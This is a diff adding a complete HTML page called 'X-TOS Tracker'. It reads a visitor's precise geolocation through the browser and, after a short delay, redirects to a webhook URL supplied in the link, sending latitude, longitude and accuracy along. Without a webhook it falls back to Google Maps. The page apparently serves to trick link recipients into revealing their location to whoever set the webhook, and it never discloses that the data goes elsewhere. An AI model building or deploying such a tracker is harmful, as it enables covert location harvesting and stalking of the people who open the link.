@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>X-TOS Tracker</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: Arial; text-align: center; padding: 20px; background: #000; color: #0f0; }
+        .container { max-width: 400px; margin: 0 auto; }
+        .status { padding: 20px; border: 1px solid #0f0; margin: 20px 0; }
+        .loading { animation: blink 1s infinite; }
+        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0.3; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🛡️ X-TOS TRACKER</h2>
+        <div id="status" class="status loading">📡 Acquiring location...</div>
+        <div id="coords"></div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const webhookUrl = urlParams.get('webhook') || '';
+        
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                const accuracy = position.coords.accuracy;
+                
+                document.getElementById('status').innerHTML = '✅ Location captured';
+                document.getElementById('coords').innerHTML = 
+                    `📍 ${lat.toFixed(6)}, ${lng.toFixed(6)}<br>📏 Accuracy: ${accuracy}m`;
+                
+                // Send location via URL redirect to webhook
+                if (webhookUrl) {
+                    setTimeout(() => {
+                        window.location.href = `${webhookUrl}?lat=${lat}&lng=${lng}&acc=${accuracy}&t=${Date.now()}`;
+                    }, 2000);
+                } else {
+                    // Direct redirect to maps
+                    setTimeout(() => {
+                        window.location.href = `https://maps.google.com/?q=${lat},${lng}`;
+                    }, 3000);
+                }
+                
+            }, function(error) {
+                document.getElementById('status').innerHTML = '❌ Location access denied';
+                document.getElementById('coords').innerHTML = 'Error: ' + error.message;
+                
+                setTimeout(() => {
+                    window.location.href = 'https://maps.google.com/';
+                }, 3000);
+            });
+        } else {
+            document.getElementById('status').innerHTML = '❌ Geolocation not supported';
+        }
+    </script>
+</body>
+</html>
